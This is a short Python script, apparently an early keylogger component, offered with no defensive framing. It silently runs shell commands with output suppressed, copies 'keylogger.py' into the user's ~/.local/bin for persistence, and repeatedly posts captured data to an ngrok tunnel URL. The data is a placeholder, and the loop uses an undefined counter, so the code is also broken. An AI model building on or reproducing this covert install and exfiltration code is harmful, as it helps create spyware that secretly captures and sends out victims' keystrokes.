import requests
import json
import subprocess
import time

def run(command):
    """Run a shell command silently (no stdout/stderr)."""
    subprocess.run(
        command,
        shell=True,                   # allows passing command as a string
        stdout=subprocess.DEVNULL,    # hide normal output
        stderr=subprocess.DEVNULL     # hide error output
    )

def send_data(data):
    url = 'https://frettier-chanel-coweringly.ngrok-free.dev'  # ngrok URL
    headers = {'Content-Type': 'application/json'}
    try:
        response = requests.post(url, json=data, headers=headers, timeout=10)
        return response.status_code == 200
    except requests.exceptions.RequestException as e:
        return False

# Example usage
def payload():
    run("cp keylogger.py ~/.local/bin")
    while True:
        data = "data_test"
        send_data({"pressed": data})
        print(f"Cycle {i} completed.")
        i += 1
        time.sleep(0.3)
payload()


